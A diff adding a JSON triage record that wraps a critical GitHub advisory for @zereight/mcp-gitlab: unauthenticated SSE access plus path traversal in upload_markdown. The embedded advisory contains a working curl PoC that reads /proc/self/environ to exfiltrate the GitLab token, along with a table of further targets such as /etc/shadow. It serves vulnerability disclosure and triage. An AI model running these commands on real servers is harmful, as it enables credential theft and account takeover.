@@ -1,0 +1,61 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/226511218?v=4\", \"events_url\": \"https://api.github.com/users/gil-maman-p/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/gil-maman-p/followers\", \"following_url\": \"https://api.github.com/users/gil-maman-p/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/gil-maman-p/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/gil-maman-p\", \"id\": 226511218, \"login\": \"gil-maman-p\", \"node_id\": \"U_kgDODYBJcg\", \"organizations_url\": \"https://api.github.com/users/gil-maman-p/orgs\", \"received_events_url\": \"https://api.github.com/users/gil-maman-p/received_events\", \"repos_url\": \"https://api.github.com/users/gil-maman-p/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/gil-maman-p/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/gil-maman-p/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/gil-maman-p\", \"user_view_type\": \"public\"}}, {\"type\": \"analyst\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/232525418?v=4\", \"events_url\": \"https://api.github.com/users/hodaya-prz/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/hodaya-prz/followers\", \"following_url\": \"https://api.github.com/users/hodaya-prz/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/hodaya-prz/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/hodaya-prz\", \"id\": 232525418, \"login\": \"hodaya-prz\", \"node_id\": \"U_kgDODdwOag\", \"organizations_url\": \"https://api.github.com/users/hodaya-prz/orgs\", \"received_events_url\": \"https://api.github.com/users/hodaya-prz/received_events\", \"repos_url\": \"https://api.github.com/users/hodaya-prz/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/hodaya-prz/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/hodaya-prz/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/hodaya-prz\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-61560\", \"cvss\": {\"score\": 9.8, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 9.8, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-22\", \"name\": \"Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')\"}], \"description\": \"### Summary\\n\\nThe SSE transport mode (`SSE=true`) exposes all MCP tools without any authentication. The `upload_markdown` tool reads arbitrary files from the server's local filesystem via an unsanitized `file_path` parameter and uploads them to a GitLab project. Combined, any unauthenticated network-reachable attacker can read `/proc/self/environ` to steal the server's `GITLAB_PERSONAL_ACCESS_TOKEN` and achieve full GitLab account takeover. This is the default configuration for Docker deployments.\\n\\n### Details\\n\\nTwo issues chain together:\\n\\n**1. No authentication on SSE transport (`src/index.ts:7350-7388`)**\\n\\nWhen `SSE=true` (the intended mode for Docker deployments per `docker-compose.yaml`), the `/sse` and `/messages` endpoints have zero authentication middleware. Any HTTP client that can reach the port can establish a session and invoke all ~100+ tools using the server's configured PAT.\\n\\n```typescript\\n// src/index.ts:7354 — no auth check\\napp.get(\\\"/sse\\\", async (_: Request, res: Response) => {\\n    const serverInstance = createServer();\\n    const transport = new SSEServerTransport(\\\"/messages\\\", res);\\n    await serverInstance.connect(transport);\\n});\\n```\\n\\nRemote Authorization (`REMOTE_AUTHORIZATION=true`) is explicitly incompatible with SSE mode (`src/index.ts:1833-1839`), so there is no way to add per-request auth in this transport.\\n\\n**2. Arbitrary file read in `upload_markdown` (`src/index.ts:5461-5503`)**\\n\\nThe `upload_markdown` tool calls `fs.readFileSync(filePath)` where `filePath` comes directly from user input with no validation. The Zod schema (`src/schemas.ts:2150-2153`) defines `file_path` as `z.string()` with no path restrictions, allowlists, or sandboxing.\\n\\n```typescript\\nasync function markdownUpload(projectId: string, filePath: string) {\\n    if (!fs.existsSync(filePath)) {\\n        throw new Error(`File not found: ${filePath}`);\\n    }\\n    const fileBuffer = fs.readFileSync(filePath);  // Arbitrary file read — no path validation\\n    // ... uploads to GitLab project via POST /projects/:id/uploads\\n}\\n```\\n\\nThis tool is in the `users` toolset, which is **enabled by default**.\\n\\n**Docker amplification:** The `Dockerfile` has no `USER` directive, so the process runs as root. The `docker-compose.yaml` maps `3002:3002`, which binds `0.0.0.0` by default, exposing the unauthenticated endpoint to the network.\\n\\n### PoC\\n\\n**Prerequisites:**\\n- A running `@zereight/mcp-gitlab` instance with `SSE=true` and `GITLAB_PERSONAL_ACCESS_TOKEN` set (this is the default Docker deployment config)\\n- Network access to the server's port (default: 3002)\\n- A GitLab project ID the PAT has write access to (use `list_projects` to enumerate)\\n\\n**Steps:**\\n\\n```bash\\n# 1. Connect to the unauthenticated SSE endpoint and capture the session ID\\nSESSION_ID=$(curl -s -N http://<HOST>:3002/sse | head -1 | grep -oP 'sessionId=\\\\K[^&\\\\s]+')\\n\\n# 2. (Optional) Enumerate accessible projects to find a writable project ID\\ncurl -X POST \\\"http://<HOST>:3002/messages?sessionId=$SESSION_ID\\\" \\\\\\n  -H \\\"Content-Type: application/json\\\" \\\\\\n  -d '{\\n    \\\"jsonrpc\\\": \\\"2.0\\\",\\n    \\\"id\\\": 1,\\n    \\\"method\\\": \\\"tools/call\\\",\\n    \\\"params\\\": {\\n      \\\"name\\\": \\\"list_projects\\\",\\n      \\\"arguments\\\": {\\\"owned\\\": true}\\n    }\\n  }'\\n\\n# 3. Read /proc/self/environ (contains GITLAB_PERSONAL_ACCESS_TOKEN in plaintext)\\n#    and upload it to a GitLab project\\ncurl -X POST \\\"http://<HOST>:3002/messages?sessionId=$SESSION_ID\\\" \\\\\\n  -H \\\"Content-Type: application/json\\\" \\\\\\n  -d '{\\n    \\\"jsonrpc\\\": \\\"2.0\\\",\\n    \\\"id\\\": 2,\\n    \\\"method\\\": \\\"tools/call\\\",\\n    \\\"params\\\": {\\n      \\\"name\\\": \\\"upload_markdown\\\",\\n      \\\"arguments\\\": {\\n        \\\"project_id\\\": \\\"<WRITABLE_PROJECT_ID>\\\",\\n        \\\"file_path\\\": \\\"/proc/self/environ\\\"\\n      }\\n    }\\n  }'\\n\\n# 4. The response contains a GitLab upload URL like:\\n#    {\\\"markdown\\\": \\\"![environ](/uploads/abc123def456/environ)\\\", \\\"url\\\": \\\"/uploads/abc123def456/environ\\\"}\\n#\\n# 5. Retrieve the uploaded file from GitLab:\\ncurl \\\"https://gitlab.example.com/<namespace>/<project>/uploads/abc123def456/environ\\\"\\n\\n# 6. The file contains NUL-separated environment variables including:\\n#    GITLAB_PERSONAL_ACCESS_TOKEN=glpat-xxxxxxxxxxxxxxxxxxxx\\n#\\n# 7. Use the stolen PAT for full GitLab API access:\\ncurl -H \\\"Private-Token: glpat-xxxxxxxxxxxxxxxxxxxx\\\" \\\"https://gitlab.example.com/api/v4/user\\\"\\n```\\n\\n**Other exfiltrable targets (running as root in Docker):**\\n\\n| File | Contents |\\n|---|---|\\n| `/proc/self/environ` | All env vars including `GITLAB_PERSONAL_ACCESS_TOKEN=glpat-xxxxx` |\\n| `/proc/self/cmdline` | Command line args (token if passed via CLI) |\\n| `/etc/shadow` | System password hashes |\\n| `/app/build/index.js` | Full application source code |\\n| `~/.gitlab-mcp-token.json` | OAuth tokens (if OAuth mode was used) |\\n\\n### Impact\\n\\n**Unauthenticated full GitLab account takeover.** Any attacker with network access to the MCP server port can steal the Personal Access Token and gain complete access to the GitLab instance as the token owner - including all repositories, CI/CD secrets and variables, deploy keys, project settings, and admin functions if the user has admin privileges. No credentials or user interaction are required. This is the default configuration for Docker deployments\", \"ghsa_id\": \"GHSA-cv3r-c5h8-f4g5\", \"github_reviewed_at\": \"2026-09-16T13:48:28Z\", \"html_url\": \"https://github.com/advisories/GHSA-cv3r-c5h8-f4g5\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-cv3r-c5h8-f4g5\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-61560\"}], \"nvd_published_at\": \"2026-09-15T22:16:58Z\", \"published_at\": \"2026-09-16T13:48:28Z\", \"references\": [\"https://github.com/zereight/gitlab-mcp/security/advisories/GHSA-cv3r-c5h8-f4g5\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-61560\", \"https://github.com/zereight/gitlab-mcp/pull/482\", \"https://github.com/zereight/gitlab-mcp/pull/554\", \"https://github.com/zereight/gitlab-mcp/pull/622\", \"https://github.com/zereight/gitlab-mcp/commit/e436ee4ad067b64584ec9312c9e9c9a2641c1976\", \"https://github.com/zereight/gitlab-mcp/releases/tag/v2.1.27\", \"https://github.com/advisories/GHSA-cv3r-c5h8-f4g5\"], \"repository_advisory_url\": \"https://api.github.com/repos/zereight/gitlab-mcp/security-advisories/GHSA-cv3r-c5h8-f4g5\", \"severity\": \"critical\", \"source_code_location\": \"https://github.com/zereight/gitlab-mcp\", \"summary\": \"@zereight/mcp-gitlab: Unauthenticated arbitrary file read via `upload_markdown` enables PAT exfiltration and full account takeover\", \"type\": \"reviewed\", \"updated_at\": \"2026-09-16T13:48:30Z\", \"url\": \"https://api.github.com/advisories/GHSA-cv3r-c5h8-f4g5\", \"vulnerabilities\": [{\"first_patched_version\": \"2.1.27\", \"package\": {\"ecosystem\": \"npm\", \"name\": \"@zereight/mcp-gitlab\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"< 2.1.27\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-cv3r-c5h8-f4g5",
+  "decision": {
+    "priority": "P3",
+    "reasons": [
+      "初期アクセス面の製品のCritical"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "attack_surface_class": "devtools_admin",
+    "attack_surface_reach": "service",
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "kev_entries": {},
+    "kev_ransomware": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "@zereight/mcp-gitlab: < 2.1.27"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2026-61560"
+    ],
+    "cvss_score": 9.8,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "@zereight/mcp-gitlab"
+    ],
+    "remote": true,
+    "vendor_severity": "critical"
+  },
+  "first_seen_at": "2026-09-16T19:13:43.337020Z",
+  "provenance": {
+    "content_sha256": "d7fddf1d4aeaa8088ca4733ab83a72159fbeddbe975c1e43a82b82263a7dc7cd",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-09-16T13:48:28Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-cv3r-c5h8-f4g5",
+  "status": "active",
+  "title": "@zereight/mcp-gitlab: Unauthenticated arbitrary file read via `upload_markdown` enables PAT exfiltration and full account takeover",
+  "updated_at": "2026-09-16T13:48:30Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-cv3r-c5h8-f4g5"
+}
